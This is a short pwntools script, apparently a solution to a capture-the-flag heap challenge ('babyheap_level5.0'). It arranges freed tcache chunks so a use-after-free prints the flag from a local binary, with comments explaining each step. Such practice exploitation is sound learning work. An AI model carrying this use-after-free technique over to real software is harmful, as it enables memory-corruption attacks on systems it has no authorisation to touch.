#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level5.0_patched'
p = process(binary)

s = '''
b malloc
b free
'''

gdb.attach(p, s)


# Getting flag chunk to local_128[0] so that it can be freed later
p.sendline("malloc 0 848")
p.sendline("free 0")
p.sendline("read_flag")

# free one more chunk with the same size so tha tiw oudl be the next* pointer of flag chunk 
p.sendline("malloc 1 848")
p.sendline("free 1")

# free the flag chunk, aka local_128[0]. Now its next* pointer points to the previos free chunk. local_128[1] 
p.sendline("free 0")
#uaf, print the content of the freed chunk.
p.sendline("puts_flag")


p.interactive()
